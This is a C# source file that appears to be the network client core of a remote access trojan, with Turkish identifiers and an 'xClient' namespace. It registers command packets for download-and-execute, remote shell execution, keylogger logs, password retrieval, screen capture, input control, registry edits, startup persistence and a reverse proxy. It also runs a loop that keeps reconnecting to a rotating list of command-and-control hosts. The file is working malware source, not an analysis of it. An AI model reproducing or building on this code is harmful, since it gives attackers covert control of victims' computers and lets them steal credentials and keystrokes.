using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using xClient.Ayarlar;
using xClient.KuuhakuÇekirdek.Veri;
using xClient.KuuhakuÇekirdek.Eylemler;
using xClient.KuuhakuÇekirdek.NetSerializer;
using xClient.KuuhakuÇekirdek.Paketler;
using xClient.KuuhakuÇekirdek.Utilityler;

namespace xClient.KuuhakuÇekirdek.Ağ
{
    public class KuuhakuClient : Client
    {
        public static bool Exiting { get; private set; }
        public bool Authenticated { get; private set; }
        private readonly HostsManager _hosts;

        public KuuhakuClient(HostsManager hostsManager) : base()
        {
            this._hosts = hostsManager;

            base.Serializer = new Serializer(new Type[]
            {
                typeof (Paketler.ServerPaketleri.GetAuthentication),
                typeof (Paketler.ServerPaketleri.DoClientDisconnect),
                typeof (Paketler.ServerPaketleri.DoClientReconnect),
                typeof (Paketler.ServerPaketleri.DoClientUninstall),
                typeof (Paketler.ServerPaketleri.DoDownloadAndExecute),
                typeof (Paketler.ServerPaketleri.DoUploadAndExecute),
                typeof (Paketler.ServerPaketleri.GetDesktop),
                typeof (Paketler.ServerPaketleri.GetProcesses),
                typeof (Paketler.ServerPaketleri.DoProcessKill),
                typeof (Paketler.ServerPaketleri.DoProcessStart),
                typeof (Paketler.ServerPaketleri.GetDrives),
                typeof (Paketler.ServerPaketleri.GetDirectory),
                typeof (Paketler.ServerPaketleri.DoDownloadFile),
                typeof (Paketler.ServerPaketleri.DoMouseEvent),
                typeof (Paketler.ServerPaketleri.DoKeyboardEvent),
                typeof (Paketler.ServerPaketleri.GetSystemInfo),
                typeof (Paketler.ServerPaketleri.DoVisitWebsite),
                typeof (Paketler.ServerPaketleri.DoShowMessageBox),
                typeof (Paketler.ServerPaketleri.DoClientUpdate),
                typeof (Paketler.ServerPaketleri.GetMonitors),
                typeof (Paketler.ServerPaketleri.DoShellExecute),
                typeof (Paketler.ServerPaketleri.DoPathRename),
                typeof (Paketler.ServerPaketleri.DoPathDelete),
                typeof (Paketler.ServerPaketleri.DoShutdownAction),
                typeof (Paketler.ServerPaketleri.GetStartupItems),
                typeof (Paketler.ServerPaketleri.DoStartupItemAdd),
                typeof (Paketler.ServerPaketleri.DoStartupItemRemove),
                typeof (Paketler.ServerPaketleri.DoDownloadFileCancel),
                typeof (Paketler.ServerPaketleri.GetKeyloggerLogs),
                typeof (Paketler.ServerPaketleri.DoUploadFile),
                typeof (Paketler.ServerPaketleri.GetPasswords),
                typeof (Paketler.ServerPaketleri.DoLoadRegistryKey),
                typeof (Paketler.ServerPaketleri.DoCreateRegistryKey),
                typeof (Paketler.ServerPaketleri.DoDeleteRegistryKey),
                typeof (Paketler.ServerPaketleri.DoRenameRegistryKey),
                typeof (Paketler.ServerPaketleri.DoCreateRegistryValue),
                typeof (Paketler.ServerPaketleri.DoDeleteRegistryValue),
                typeof (Paketler.ServerPaketleri.DoRenameRegistryValue),
                typeof (Paketler.ServerPaketleri.DoChangeRegistryValue),
                typeof (Paketler.ServerPaketleri.SetAuthenticationSuccess),
                typeof (Paketler.ClientPaketleri.GetAuthenticationResponse),
                typeof (Paketler.ClientPaketleri.SetStatus),
                typeof (Paketler.ClientPaketleri.SetStatusFileManager),
                typeof (Paketler.ClientPaketleri.SetUserStatus),
                typeof (Paketler.ClientPaketleri.GetDesktopResponse),
                typeof (Paketler.ClientPaketleri.GetProcessesResponse),
                typeof (Paketler.ClientPaketleri.GetDrivesResponse),
                typeof (Paketler.ClientPaketleri.GetDirectoryResponse),
                typeof (Paketler.ClientPaketleri.DoDownloadFileResponse),
                typeof (Paketler.ClientPaketleri.GetSystemInfoResponse),
                typeof (Paketler.ClientPaketleri.GetMonitorsResponse),
                typeof (Paketler.ClientPaketleri.DoShellExecuteResponse),
                typeof (Paketler.ClientPaketleri.GetStartupItemsResponse),
                typeof (Paketler.ClientPaketleri.GetKeyloggerLogsResponse),
                typeof (Paketler.ClientPaketleri.GetPasswordsResponse),
                typeof (Paketler.ClientPaketleri.GetRegistryKeysResponse),
                typeof (Paketler.ClientPaketleri.GetCreateRegistryKeyResponse),
                typeof (Paketler.ClientPaketleri.GetDeleteRegistryKeyResponse),
                typeof (Paketler.ClientPaketleri.GetRenameRegistryKeyResponse),
                typeof (Paketler.ClientPaketleri.GetCreateRegistryValueResponse),
                typeof (Paketler.ClientPaketleri.GetDeleteRegistryValueResponse),
                typeof (Paketler.ClientPaketleri.GetRenameRegistryValueResponse),
                typeof (Paketler.ClientPaketleri.GetChangeRegistryValueResponse),
                typeof (ReverseProxy.Packets.ReverseProxyConnect),
                typeof (ReverseProxy.Packets.ReverseProxyConnectResponse),
                typeof (ReverseProxy.Packets.ReverseProxyData),
                typeof (ReverseProxy.Packets.ReverseProxyDisconnect)
            });
            base.ClientState += OnClientState;
            base.ClientRead += OnClientRead;
            base.ClientFail += OnClientFail;
        }

        public void Connect()
        {
            while (!Exiting)
            {
                if (!Connected)
                {
                    Thread.Sleep(100 + new Random().Next(0, 250));

                    Host host = _hosts.GetNextHost();

                    base.Connect(host.HostAdı, host.Port);

                    Thread.Sleep(200);

                    Application.DoEvents();
                }

                while (Connected)
                {
                    Application.DoEvents();
                    Thread.Sleep(2500);
                }

                if (Exiting)
                {
                    Disconnect();
                    return;
                }

                Thread.Sleep(Settings.RECONNECTDELAY + new Random().Next(250, 750));
            }
        }

        private void OnClientRead(Client client, IPacket packet)
        {
            var type = packet.GetType();

            if (!Authenticated)
            {
                if (type == typeof(Paketler.ServerPaketleri.GetAuthentication))
                {
                    Eylemİşleyicisi.HandleGetAuthentication((Paketler.ServerPaketleri.GetAuthentication)packet, client);
                }
                else if (type == typeof(Paketler.ServerPaketleri.SetAuthenticationSuccess))
                {
                    Authenticated = true;
                }
                return;
            }

            PacketHandler.HandlePacket(client, packet);
        }

        private void OnClientFail(Client client, Exception ex)
        {
            Debug.WriteLine("Client Hatası - Exception Mesajı: " + ex.Message);
            client.Disconnect();
        }

        private void OnClientState(Client client, bool connected)
        {
            Authenticated = false;

            if (!connected && !Exiting)
                LostConnection();
        }

        private void LostConnection()
        {
            Eylemİşleyicisi.CloseShell();
        }

        public void Exit()
        {
            Exiting = true;
            Disconnect();
        }
    }
}